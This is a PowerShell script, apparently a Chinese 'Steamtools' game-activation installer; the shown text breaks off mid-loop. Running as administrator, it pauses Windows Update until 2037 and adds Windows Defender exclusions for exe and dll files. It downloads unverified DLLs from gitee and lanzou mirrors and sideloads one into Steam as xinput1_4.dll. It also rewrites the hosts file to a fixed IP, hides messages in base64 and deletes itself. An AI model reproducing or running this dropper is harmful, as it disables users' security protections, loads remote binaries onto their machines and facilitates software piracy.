Clear-Host
#Requires -RunAsAdministrator
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = "SilentlyContinue"

Write-Host -NoNewline "                                                                                                                               `r"
Write-Host -NoNewline "                                                        %@@@@@@@@@@@@                                                          `r"
Write-Host -NoNewline "                                                   @@@@@@@@@@@@@@@@@@@@@@                                                     `r"
Write-Host -NoNewline "                                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                  `r"
Write-Host -NoNewline "                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                               `r"
Write-Host -NoNewline "                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                                             `r"
Write-Host -NoNewline "                                          %@@@@@@@@@@@@@@@@@@@@@@@@:        %@@@@@@                                            `r"
Write-Host -NoNewline "                                         @@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@  @@@@@                                           `r"
Write-Host -NoNewline "                                        @@@@@@@@@@@@@@@@@@@@@@@     @        @  :@@@@                                         `r"
Write-Host -NoNewline "                                       @@@@@@@@@@@@@@@@@@@@@@@     @         :@   @@@@                                        `r"
Write-Host -NoNewline "                                      @@@@@@@@@@@@@@@@@@@@@@@     @           -@   @@@@@                                        `r"
Write-Host -NoNewline "                                    @@@@@@@@@@@@@@@@@@@@@@@@     @             @   @@@@@@                                      `r"
Write-Host -NoNewline "                                    @@@@@@@@@@@@@@@@@@@@@@        @           @    @@@@@@@                                     `r"
Write-Host -NoNewline "                                    *@@@@@@@@@@@@@@@@@@@@.         @         @    @@@@@@@@                                     `r"
Write-Host -NoNewline "                                        *@@@@@@@@@@@@@@@            @@@@@@@@@    @@@@@@@@@                                     `r"
Write-Host -NoNewline "                                            +@@@@@@@@@@                         @@@@@@@@@@                                     `r"
Write-Host -NoNewline "                                                +@@                           @@@@@@@@@@@@                                     `r"
Write-Host -NoNewline "                                                     @@@@@                 @@@@@@@@@@@@@@@                                     `r"
Write-Host -NoNewline "                                                          @           @@@@@@@@@@@@@@@@@@@                                      `r"
Write-Host -NoNewline "                                      @@@                  @   @@@@@@@@@@@@@@@@@@@@@@@@%                                       `r"
Write-Host -NoNewline "                                       @@@@@@    @        @   -@@@@@@@@@@@@@@@@@@@@@@@@                                        `r"
Write-Host -NoNewline "                                       .@@@@@@    @      @    @@@@@@@@@@@@@@@@@@@@@@@@                                         `r"
Write-Host -NoNewline "                                         @@@@@@-   @@@@@@    @@@@@@@@@@@@@@@@@@@@@@@%                                          `r"
Write-Host -NoNewline "                                          @@@@@@@           @@@@@@@@@@@@@@@@@@@@@@@                                            `r"
Write-Host -NoNewline "                                            @@@@@@@@:    @@@@@@@@@@@@@@@@@@@@@@@@@                                             `r"
Write-Host -NoNewline "                                             *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                               `r"
Write-Host -NoNewline "                                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                  `r"
Write-Host -NoNewline "                                                   @@@@@@@@@@@@@@@@@@@@@@@%                                                    `r"
Write-Host -NoNewline "                                                       @@@@@@@@@@@@@@@+                                                        `r"
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r"
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r"
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r"
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r"
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r"
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r"
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r"
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r"
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r"
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r"
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r"
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r"
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r"
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r"
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r"
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r"
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r"
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r"
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r"
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r"
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r"


$skipMessage = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("WwBTAFQARQBBAE0AXQAgAFMAdABlAGEAbQAgAO9T/YChbAlnY2tueIlbxYgM//eLiVvFiCAAUwB0AGUAYQBtACAADlSNUdWL"))  
$downloadSuccess = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("WwBTAFQARQBBAE0AXQAgAMBvO23bjwt6xlEHWS1ODP/3iw16GVAuAC4ALgA="))  
$hashMismatch = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("WwBTAFQARQBBAE0AXQAgAPeLf08odaF7BnRYVCFqD1/Qj0yI"))  
$downloadFailed = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("WwBTAFQARQBBAE0AXQAgAPJdGpDHjyAAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAMBoS20M/69zg1iJW2hR"))  
$activationComplete = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("WwAaIl0A"))  # [√]
$admin = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("WwBTAFQARQBBAE0AXQAgAMBvO23bjwt6xlEHWTFc6n4M/1MAdABlAGEAbQAgAFNiAF8tTgz/94sNehlQLgAuAC4A"))
$360s = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("DQAgAFsAUwBUAEUAQQBNAC0A21b2U0mDOG4PYl0AwG87bYxbEGIM/+9T5U5zUe2VLGeXeuNThk4="))  
$Update = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("9GawZS1OLgAuAC4A"))  



$regPath = "HKCU:\Software\Valve\Steam\Apps\3545990"


if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}


New-ItemProperty -Path $regPath -Name "manifests" -Value "3545991_614562067441114535" -PropertyType String -Force | Out-Null

$regPath = "HKCU:\Software\Valve\Steam\Apps\3218580"


if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}


New-ItemProperty -Path $regPath -Name "manifests" -Value "3218581_6726120155961660712" -PropertyType String -Force | Out-Null



Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "FlightSettingsMaxPauseDays" -Value 0x000001b8


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "PauseFeatureUpdatesStartTime" -Value "2023-08-02T10:00:52Z"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "PauseFeatureUpdatesEndTime" -Value "2037-12-05T09:59:52Z"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "PauseQualityUpdatesStartTime" -Value "2023-08-02T10:00:52Z"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "PauseQualityUpdatesEndTime" -Value "2037-12-05T09:59:52Z"


Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "PauseUpdatesStartTime" -Value "2023-08-02T09:59:52Z"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" -Name "PauseUpdatesExpiryTime" -Value "2037-12-05T09:59:52Z"


#$found360Process = #[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("wGhLbTBSqGAJZ4lbxYgzADYAMACJW2hRa1PrWAz/Gk9xX81UwG87bduPC3oM//eLSFEoVzMANgAwAIR24U/7TjpTzJ#H7baBScwB0AGUAYQBtAO52VV/hT/tODlSCZvZlAJD6UTMANgAwAAz/jVHNkbBlZ2JMiH1U5E5zU+9TAjA=")) 
#if (Get-Process -Name "360Tray" -ErrorAction SilentlyContinue) {
#    Write-Output $found360Process
#   return
#}


function Invoke-AESECBEncryption {
    param(
        [byte[]]$Plaintext,
        [byte[]]$Key = [System.Text.Encoding]::UTF8.GetBytes("lanZouY-disk-app")
    )
    
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $Key
        $aes.IV = [byte[]]::new(16)
        
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($Plaintext, 0, $Plaintext.Length)
        
        $encryptor.Dispose()
        $aes.Dispose()
        
        return [BitConverter]::ToString($encryptedBytes).Replace('-', '').ToUpper()
    }
    catch {
        return $null
    }
}

function Get-LanzouPremiumUrl {
    param(
        [string]$fileId,
        [string]$userId,
        [string]$shareId
    )
    
    if ([string]::IsNullOrWhiteSpace($fileId) -or 
        [string]::IsNullOrWhiteSpace($userId) -or 
        [string]::IsNullOrWhiteSpace($shareId)) {
        return $null
    }
    
    try {
        $downloadPlain = [System.Text.Encoding]::UTF8.GetBytes("${fileId}|${userId}")
        $downloadId = Invoke-AESECBEncryption -Plaintext $downloadPlain
        
        if ([string]::IsNullOrWhiteSpace($downloadId)) {
            return $null
        }
        
        $timestamp = [DateTimeOffset]::Now.ToUnixTimeMilliseconds()
        $authPlain = [System.Text.Encoding]::UTF8.GetBytes("${fileId}|${timestamp}")
        $auth = Invoke-AESECBEncryption -Plaintext $authPlain
        
        if ([string]::IsNullOrWhiteSpace($auth)) {
            return $null
        }
        
        $timestampBytes = [System.Text.Encoding]::UTF8.GetBytes($timestamp.ToString())
        $encTimestamp = Invoke-AESECBEncryption -Plaintext $timestampBytes
        
        if ([string]::IsNullOrWhiteSpace($encTimestamp)) {
            return $null
        }
        
        $url = "https://api.ilanzou.com/unproved/file/redirect?downloadId=$downloadId&enable=1&devType=6&uuid=1&timestamp=$encTimestamp&auth=$auth&shareId=$shareId"
        
        $response = Invoke-WebRequest -UseBasicParsing -Uri $url -Method Get -MaximumRedirection 0 -ErrorAction SilentlyContinue
        
        if ($null -ne $response -and $response.Headers.ContainsKey('Location')) {
            return $response.Headers['Location']
        }
        
        return $null
    }
    catch {
        return $null
    }
}

function Get-RemoteConfig {
    param ([string[]]$urls)
    foreach ($url in $urls) {
        try {
            $response = Invoke-WebRequest -UseBasicParsing -Uri $url -TimeoutSec 10 -ErrorAction Stop
            if (-not [string]::IsNullOrWhiteSpace($response.Content)) {
                return $response.Content
            }
        } catch { continue }
    }
    return $null
}

function Parse-IniContent {
    param ([string]$content)
    $config = @{}
    $currentSection = ""
    foreach ($line in ($content -split "`n")) {
        $line = $line.Trim()
        if ([string]::IsNullOrWhiteSpace($line) -or $line.StartsWith("#") -or $line.StartsWith(";")) { continue }
        if ($line -match '^\[(.+)\]$') {
            $currentSection = $matches[1]
            if (-not $config.ContainsKey($currentSection)) { $config[$currentSection] = @{} }
            continue
        }
        if ($line -match '^([^=]+)\s*=\s*(.+)$') {
            $key = $matches[1].Trim()
            $value = $matches[2].Trim()
            if (-not [string]::IsNullOrWhiteSpace($currentSection)) {
                $config[$currentSection][$key] = $value
            }
        }
    }
    return $config
}

function Get-BackupDownloadUrl {
    param ([string]$fileName)
    try {
        $configContent = Get-RemoteConfig -urls $configUrls
        if ([string]::IsNullOrWhiteSpace($configContent)) { return $null }
        $config = Parse-IniContent -content $configContent
        if ($config.ContainsKey("PEAK_LINKS") -and $config["PEAK_LINKS"].ContainsKey($fileName)) {
            return $config["PEAK_LINKS"][$fileName]
        }
        if ($config.ContainsKey("LINKS") -and $config["LINKS"].ContainsKey($fileName)) {
            return $config["LINKS"][$fileName]
        }
        return $null
    } catch { return $null }
}



function Invoke-WithRetry
{
    param(
        [scriptblock]$ScriptBlock,
        [int]$MaxRetries = 10,
        [int]$DelaySeconds = 1
    )
    $retryCount = 0
    while ($retryCount -lt $MaxRetries)
    {
        try
        {
            return & $ScriptBlock
        }
        catch
        {
            $retryCount++
            if ($retryCount -ge $MaxRetries)
            {
                throw $_
            }
            Start-Sleep -Seconds $DelaySeconds
        }
    }
}

function Get-DownloadUrl
{
    param (
        [string]$fid,
        [string]$p = $null
    )
    try
    {
        $baseUrl = 'https://lanzoup.com'
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
    }
    catch
    {
        $baseUrl = 'https://lanzoui.com'
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl/$fid" -Headers @{ 'User-Agent' = '' }
    }
    $content = $response.Content
    $locUrl = [regex]::Match($content, 'window.location.href="(.*?)";').Groups[1].Value
    if ($locUrl)
    {
        $response = Invoke-WebRequest -UseBasicParsing -Uri $locUrl -Headers @{ 'User-Agent' = '' }
        $content = $response.Content
    }
    $iframeUrl = [regex]::Match($content, 'class="ifr2".+?src="(.*?)"').Groups[1].Value
    if ($iframeUrl)
    {
        $response = Invoke-WebRequest -UseBasicParsing -Uri "$baseUrl$iframeUrl" -Headers @{ 'User-Agent' = '' } -Method Post
        $content = $response.Content
        $sign = [regex]::Match($content, "var wp_sign = '(.*?)';").Groups[1].Value
    }
    else
    {
        $sign = [regex]::Match($content, "var skdklds = '(.*?)';").Groups[1].Value
    }
    if (-not$sign)
    {
        return
    }
    $urlMatch = [regex]::Match($content, "url : '(.*?file=\d{2,})',").Groups[1].Value
    if (-not$urlMatch)
    {
        return
    }
    $headers = @{
        'User-Agent' = ''
        'Referer' = $response.BaseResponse.ResponseUri.AbsoluteUri
    }
    $body = @{ 'action' = 'downprocess'; 'sign' = $sign; 'kd' = 1 }
    if ($null -ne $p)
    {
        $body['p'] = $p
    }
    $response = Invoke-RestMethod -Uri "$baseUrl$urlMatch" -Headers $headers -Method Post -Body $body
    if ($null -eq $response)
    {
        return
    }
    $dom = $response.dom
    if (-not$dom)
    {
        return
    }
    $downloadUrl = $response.url
    if (-not$downloadUrl)
    {
        return
    }
    return "$dom/file/$downloadUrl"
}


function DownloadFile
{
    param(
        [string]$url,
        [string]$savePath,
        [string]$hash,
        [string]$targetPath,
        [string]$fileName,
        [string]$lanzouFid = $null,  
        [string]$lanzouPremiumFileId = $null,  
        [string]$lanzouPremiumUserId = $null,  
        [string]$lanzouPremiumShareId = $null,
        [int]$timeoutSeconds = 60
    )
    
    if (-not $targetPath)
    {
        $targetPath = $savePath
    }
    
    
    if (Test-Path $targetPath)
    {
        $existingHash = (Get-FileHash -Path $targetPath -Algorithm MD5).Hash
        if ($existingHash -eq $hash)
        {
            Write-Host "OK" -ForegroundColor Green
            return
        }
        else
        {
            Write-Host "文件异常,请勿使用其他powershell命令,修复中..." -ForegroundColor Yellow
        }
    }
    
    
    $urls = @()
    
    if ($fileName)
    {
        try
        {
            $backupUrl = Get-BackupDownloadUrl -fileName $fileName
            if (-not [string]::IsNullOrWhiteSpace($backupUrl))
            {
                $urls += $backupUrl
            }
        }
        catch {}
    }
    
    if (-not [string]::IsNullOrWhiteSpace($lanzouPremiumFileId) -and 
        -not [string]::IsNullOrWhiteSpace($lanzouPremiumUserId) -and 
        -not [string]::IsNullOrWhiteSpace($lanzouPremiumShareId))
    {
        try
        {
            $premiumUrl = Get-LanzouPremiumUrl -fileId $lanzouPremiumFileId -userId $lanzouPremiumUserId -shareId $lanzouPremiumShareId
            if (-not [string]::IsNullOrWhiteSpace($premiumUrl))
            {
                $urls += $premiumUrl
            }
        }
        catch {}
    }
    
    $urls += $url
    
    if (-not [string]::IsNullOrWhiteSpace($lanzouFid))
    {
        try
        {
            $lanzouUrl = Get-DownloadUrl -fid $lanzouFid
            if (-not [string]::IsNullOrWhiteSpace($lanzouUrl))
            {
                $urls += $lanzouUrl
            }
        }
        catch {}
    }
    
    $downloadSuccess = $false
    
    foreach ($downloadUrl in $urls)
    {
        if ($downloadSuccess) { break }
        
        for ($attempt = 1; $attempt -le 2; $attempt++)
        {
            try
            {
                
                if (Test-Path $savePath)
                {
                    Remove-Item -Path $savePath -Force -ErrorAction SilentlyContinue
                }
                
                
                $expectedSize = -1
                try
                {
                    $headRequest = [System.Net.WebRequest]::Create($downloadUrl)
                    $headRequest.Method = "HEAD"
                    $headRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    $headRequest.Timeout = 10000
                    
                    if ($downloadUrl -like "*bakstotre.com*")
                    {
                        $headRequest.Referer = "https://www.bakstotre.com/"
                    }
                    
                    $headResponse = $headRequest.GetResponse()
                    $expectedSize = $headResponse.ContentLength
                    $headResponse.Close()
                }
                catch
                {
                    
                    $expectedSize = -1
                }
                
                
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                
                if ($downloadUrl -like "*bakstotre.com*")
                {
                    $webClient.Headers.Add("Referer", "https://www.bakstotre.com/")
                }
                else
                {
                    $webClient.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9")
                }
                
                $downloadTask = $webClient.DownloadFileTaskAsync($downloadUrl, $savePath)
                $completed = $downloadTask.Wait([TimeSpan]::FromSeconds($timeoutSeconds))
                $webClient.Dispose()
                
                if (-not $completed)
                {
                    throw "下载超时"
                }
                
                if (-not (Test-Path $savePath))
                {
                    throw "下载文件不存在"
                }
                
                $actualSize = (Get-Item $savePath).Length
                
                if ($actualSize -eq 0)
                {
                    throw "下载文件大小为0"
                }
                
                
                if ($expectedSize -gt 0 -and $actualSize -ne $expectedSize)
                {
                    throw "文件大小不匹配 (预期: $expectedSize, 实际: $actualSize)"
                }
                
                
                if ($savePath -ne $targetPath)
                {
                    Move-Item -Path $savePath -Destination $targetPath -Force -ErrorAction Stop
                }
                
                
                if (-not (Test-Path $targetPath))
                {
                    throw "目标文件不存在"
                }
                
                Write-Host "OK" -ForegroundColor Green
                $downloadSuccess = $true
                break
            }
            catch
            {
                if ($attempt -lt 2)
                {
                    Start-Sleep -Seconds 2
                }
            }
        }
    }
    
    if (-not $downloadSuccess)
    {
        Write-Host "ALL FAIL" -ForegroundColor Red
        throw "所有下载源均失败"
    }
}

function Test-Is64Bit {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        if ($bytes.Length -lt 64) { return $false }

        $peOffset = [System.BitConverter]::ToInt32($bytes, 0x3C)
        if ($peOffset -ge $bytes.Length - 2) { return $false }

        if (
            $bytes[$peOffset] -ne 0x50 -or 
            $bytes[$peOffset + 1] -ne 0x45 -or 
            $bytes[$peOffset + 2] -ne 0x00 -or 
            $bytes[$peOffset + 3] -ne 0x00
        ) {
            return $false
        }

        return [System.BitConverter]::ToUInt16($bytes, $peOffset + 4) -in @(0x8664, 0x200, 0xAA64)
    }
    catch {
        return $false
    }
}

try
{

    $filePathToDelete = "a.ps1"
    if (Test-Path $filePathToDelete)
    {
        Remove-Item -Path $filePathToDelete -Force
    }

    $targetDirectory = Join-Path $env:APPDATA "Stool"
    if (-not(Test-Path $targetDirectory))
    {
        New-Item -Path $targetDirectory -ItemType Directory | Out-Null
    }

    $savePathZip = Join-Path $targetDirectory "legit"

    Write-Host ""
    Write-Host ""
    Write-Host $downloadSuccess

    $steamRegPath = 'HKCU:\Software\Valve\Steam'
    $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
    if ($null -eq $steamPath)
    {
        Write-Host $skipMessage -ForegroundColor Red
        exit
    }
    $exePath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamExe').SteamExe
	$is64Bit = Test-Is64Bit -FilePath $exePath
    $exePid = (Get-ItemProperty -Path ($steamRegPath + "\ActiveProcess") -Name 'pid').pid
    if ($null -ne $exePid)
    {
        Stop-Process -Id $exePid -ErrorAction SilentlyContinue
    }
    $registryPath = "HKCU:\Software\Valve\Steamtools"
    if (-not(Test-Path $registryPath))
    {
        New-Item -Path $registryPath -Force | Out-Null
    }
    Set-ItemProperty -Path $registryPath -Name "packageinfo" -Value "" | Out-Null
	Set-ItemProperty -Path $registryPath -Name "s" -Value "e18e2031ec497afc0ee0" | Out-Null
    Remove-ItemProperty -Path $registryPath -Name "c" | Out-Null
    if (Test-Path "env:c")
    {
        Set-ItemProperty -Path $registryPath -Name "c" -Value $env:c -Type DWORD | Out-Null
    }

    $runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }
    $runningProcess | ForEach-Object {
        Stop-Process $_ -Force
    }

    if (-not$( [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') ))
    {
        Write-Host $hashMismatch -ForegroundColor Red
    }
	    foreach ($file in @("steam.cfg","version.dll","user32.dll","simulator.dll","dwmapi.dll","hid.dll","steam-lucky.exe","steam_api.dll"))
    {
        $filePath = Join-Path $steamPath $file
        if (Test-Path $filePath)
        {
            Remove-Item $filePath -Force
        }
    }


    $waitTimes = 10
    while (Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" })
    {
        Start-Sleep -Seconds 1
        $waitTimes--
        if ($waitTimes -lt 0)
        {
            break
        }
    }

    $ProgressPreference = 'SilentlyContinue'
    if ($is64Bit)
    {
        $savePathZip = Join-Path $targetDirectory "legit64"
        DownloadFile -url 'https://gitee.com/mrsiyecao/powershell1/raw/master/legit64' -savePath $savePathZip -hash '0AC5328D749CE05EE4D34FAD2AC7D439' -fid 'i7tT43f08fkh' -lanzouPremiumFileId '16015375606' -lanzouPremiumUserId '12770259'  -lanzouPremiumShareId 'g4WnlGPm'
    }
    else
	{		foreach ($file in @("steam.cfg","version.dll","user32.dll","simulator.dll","dwmapi.dll","hid.dll","steam-lucky.exe","steam_api.dll"))
		{
			$filePath = Join-Path $steamPath $file
			if (Test-Path $filePath)
			{
				Remove-Item $filePath -Force
			}
		}
		Write-Host "检测到steam客户端版本过旧,更新中..." -ForegroundColor Yellow
		foreach ($folder in @("package"))
		{
			$folderPath = Join-Path $steamPath $folder
			if (Test-Path $folderPath)
			{
				Remove-Item $folderPath -Recurse -Force
			}
		}

		$savePathZip = Join-Path $targetDirectory "legit64"
		DownloadFile -url 'https://gitee.com/mrsiyecao/powershell1/raw/master/legit64' -savePath $savePathZip -hash '0AC5328D749CE05EE4D34FAD2AC7D439' -fid 'i7tT43f08fkh' -lanzouPremiumFileId '16366122400' -lanzouPremiumUserId '12770259'  -lanzouPremiumShareId 'ChwnkhZ4'

		Invoke-Expression -Command "start steam://open/activateproduct"
		
			while (-not (Get-Process -Name "SteamService" -ErrorAction SilentlyContinue))
		{
			Start-Sleep -Seconds 1
		}

	}
	
	$savePathTxt = Join-Path $targetDirectory "xinput1_4.dll"
    $savePathTxt1 = Join-Path $targetDirectory "winhttp-log1.txt"
	
    if (Get-Service | where-object{ $_.name -eq "windefend" -and $_.status -eq "running" })
    {
                    Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension 'exe', 'dll'
                    Add-MpPreference -ExclusionPath $targetDirectory -ExclusionExtension 'exe', 'dll'
        Write-Host -NoNewline $downloadFailed; Write-Host $activationComplete -ForegroundColor Green
    }
    else
    {
        Write-Host -NoNewline $downloadFailed; Write-Host $activationComplete -ForegroundColor Green
    }



	$configDirectory = Join-Path $steamPath "config"
	$savePathVdf = Join-Path $configDirectory "appdata.vdf"

	if (-not(Test-Path $configDirectory))
	{
		New-Item -Path $configDirectory -ItemType Directory -ErrorAction Stop | Out-Null
	}

	$steamTxt = Join-Path $steamPath "xinput1_4.log"
	$d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")

	DownloadFile -url 'https://gitee.com/mrsiyecao/powershell1/raw/master/64/appdata.vdf' -savePath $savePathVdf -hash 'D503089A6EE3FA581960C7DEB76EC406' -fid 'ibQ1k3e9um5e' -lanzouPremiumFileId '16366144836' -lanzouPremiumUserId '12770259'  -lanzouPremiumShareId 'y7snkhMt'
	DownloadFile -url 'https://gitee.com/mrsiyecao/powershell1/raw/master/xinput1_4.dll' -savePath $savePathTxt -hash '41AD08E231C187A5B3D9CF05E9B855E4' -targetPath $d_path -fid 'iC8Jp3g3hrbi' -lanzouPremiumFileId '16833055135' -lanzouPremiumUserId '12770259'  -lanzouPremiumShareId 'qusnveDJ'

	$filePath = Join-Path $steamPath "steam.cfg"
	if (Test-Path $filePath)
	{
		Remove-Item $filePath -Force
	}



$entries = @{
    "183.162.101.93" = @("rescue-steam.muqiuxm.com.cn")
    #"192.168.1.101" = @("example2.com", "test2.com") 
}

$hostsPath = "$env:windir\System32\drivers\etc\hosts"


$existingHosts = Get-Content $hostsPath -ErrorAction SilentlyContinue


$allDomains = $entries.Values | ForEach-Object { $_ } | Sort-Object -Unique


$cleanedHosts = $existingHosts | Where-Object {
    $line = $_.Trim()
    if ($line -eq "") { return $false }
    
    $shouldKeep = $true
    foreach ($domain in $allDomains) {
        if ($line -match [regex]::Escape($domain)) {
            $shouldKeep = $false
            break
        }
    }
    return $shouldKeep
}


$newEntries = @()
foreach ($ip in $entries.Keys) {
    foreach ($domain in $entries[$ip]) {
        $newEntries += "$ip $domain"
    }
}


$newHosts = @()
if ($cleanedHosts) { $newHosts += $cleanedHosts }
$newHosts += $newEntries

try {
    $newHosts | Set-Content $hostsPath -Encoding UTF8 -ErrorAction Stop
}
catch {
    #Write-Warning "写入失败"
}


ipconfig /flushdns | Out-Null

    foreach ($file in @("steam.cfg","version.dll","user32.dll","simulator.dll","dwmapi.dll","hid.dll","steam-lucky.exe","steam_api.dll"))
    {
        $filePath = Join-Path $steamPath $file
        if (Test-Path $filePath)
        {
            Remove-Item $filePath -Force
        }
    }

    if (Test-Path $savePathTxt)
    {
        Move-Item -Path $savePathTxt -Destination $steamTxt -Force -ErrorAction Stop
        if (Test-Path $savePathTxt)
        {
            Remove-Item $savePathTxt -Force
        }

        if (Test-Path $d_path)
        {
            Remove-Item $d_path -Force -ErrorAction Stop
        }
        Rename-Item -Path $steamTxt -NewName $d_path -Force -ErrorAction Stop
    }

    if (Test-Path $savePathTxt1)
    {
        Move-Item -Path $savePathTxt1 -Destination $steamTxt1 -Force -ErrorAction Stop
        if (Test-Path $savePathTxt1)
        {
            Remove-Item $savePathTxt1 -Force
        }

        if (Test-Path $d_path1)
        {
            Remove-Item $d_path1 -Force -ErrorAction Stop
        }
        Rename-Item -Path $steamTxt1 -NewName $d_path1 -Force -ErrorAction Stop
    }

    $loginUsersPath = Join-Path $steamPath "config\loginusers.vdf"
    if (Test-Path $loginUsersPath)
    {
        (Get-Content $loginUsersPath -Encoding UTF8) -replace '("WantsOfflineMode"\s+)("\d+")', "`$1`"0`"" | Set-Content $loginUsersPath -Encoding UTF8
    }

    $configPath = Join-Path $steamPath "config\config.vdf"
    if (Test-Path $configPath)
    {
        (Get-Content $configPath -Encoding UTF8) -replace '("DisableShaderCache"\s+)("\d+")', "`$1`"1`"" | Set-Content $configPath -Encoding UTF8
    }

    if (-not(Test-Path $exePath))
    {
        $exePath = Join-Path $steamPath "steam.exe"
    }

    if (Test-Path $exePath)
    {
		Invoke-Expression -Command "start steam://open/activateproduct"
					while (-not (Get-Process -Name "SteamService" -ErrorAction SilentlyContinue))
		{
			Start-Sleep -Seconds 1
		}
	$runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" -and $_.ProcessName -notmatch "^steam\+\+" }
    $runningProcess | ForEach-Object {
        Stop-Process $_ -Force
		$waitTimes = 5
    }
		Invoke-Expression -Command "start steam://open/activateproduct"
    }
	
    else
    {
        Write-Host "  [STEAM] 主进程 $exePath 丢失，安装失败"
        exit
    }

    Write-Host "  [STEAM] 激活进程准备就绪，Steam 打开中，请稍候..."

    for ($i = 3600; $i -ge 0; $i--) {
        Write-Host $360s -NoNewline
        Start-Sleep -Seconds 1
    }

    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
    while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe"))
    {
        $parentProcessId = $instance.ProcessId
